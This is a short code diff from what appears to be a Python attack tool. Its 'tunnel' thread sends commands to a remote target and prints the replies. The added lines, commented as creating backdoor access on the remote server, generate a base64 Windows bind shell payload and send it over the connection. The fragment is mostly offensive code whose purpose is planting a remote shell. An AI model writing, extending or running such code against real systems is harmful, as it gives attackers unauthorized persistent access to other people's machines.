@@ -113,6 +113,12 @@ class tunnel(threading.Thread):
             command+=b"\n"
             self.sent_command(command,conn)
             print("Target Response: {}".format(self.get_response(conn)))
+
+            #creating a backdoor access on the remote server
+            command = self.generate_base64_bind_shell_code("windows").encode()
+            command+=b"\n"
+            self.sent_command(command,conn)
+
         except TimeoutError as t:
             print("no Response")
             
